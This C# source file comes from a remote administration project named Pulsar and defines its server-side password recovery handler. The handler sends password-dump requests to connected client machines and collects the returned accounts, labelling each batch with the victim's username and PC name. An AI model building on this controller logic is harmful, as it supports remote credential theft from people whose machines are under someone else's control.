using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Passwords;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System.Collections.Generic;
using System.Linq;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote password recovery.
    /// </summary>
    public class PasswordRecoveryHandler : MessageProcessorBase<object>
    {
        /// <summary>
        /// The clients which is associated with this password recovery handler.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// Represents the method that will handle recovered accounts.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="clientIdentifier">A unique client identifier.</param>
        /// <param name="accounts">The recovered accounts</param>
        public delegate void AccountsRecoveredEventHandler(object sender, string clientIdentifier, List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated);

        /// <summary>
        /// Raised when accounts got recovered.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event AccountsRecoveredEventHandler AccountsRecovered;

        /// <summary>
        /// Reports recovered accounts from a client.
        /// </summary>
        /// <param name="accounts">The recovered accounts.</param>
        /// <param name="clientIdentifier">A unique client identifier.</param>
        private void OnAccountsRecovered(List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated, string clientIdentifier)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = AccountsRecovered;
                var payload = (RecoveryPayload)d;
                handler?.Invoke(this, payload.ClientIdentifier, payload.Accounts, payload.Sources, payload.Truncated);
            }, new RecoveryPayload
            {
                Accounts = accounts,
                Sources = sources,
                Truncated = truncated,
                ClientIdentifier = clientIdentifier
            });
        }

        private sealed class RecoveryPayload
        {
            public List<RecoveredAccount> Accounts { get; set; }
            public List<PasswordRecoverySource> Sources { get; set; }
            public bool Truncated { get; set; }
            public string ClientIdentifier { get; set; }
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="PasswordRecoveryHandler"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The associated clients.</param>
        public PasswordRecoveryHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetPasswordsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswordsResponse pass:
                    Execute(sender, pass);
                    break;
            }
        }

        /// <summary>
        /// Starts the account recovery with the associated clients.
        /// </summary>
        public void BeginAccountRecovery()
        {
            var req = new GetPasswords();
            foreach (var client in _clients.Where(client => client != null && client.Connected))
                client.Send(req);
        }

        private void Execute(ISender client, GetPasswordsResponse message)
        {
            if (!(client is Client c) || c == null || !c.Connected)
                return;
            if (!_clients.Any(associated => associated != null && associated.Equals(c)))
                return;

            string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";

            OnAccountsRecovered(
                message?.RecoveredAccounts ?? new List<RecoveredAccount>(),
                message?.Sources ?? new List<PasswordRecoverySource>(),
                message?.Truncated ?? false,
                userAtPc);
        }
    }
}
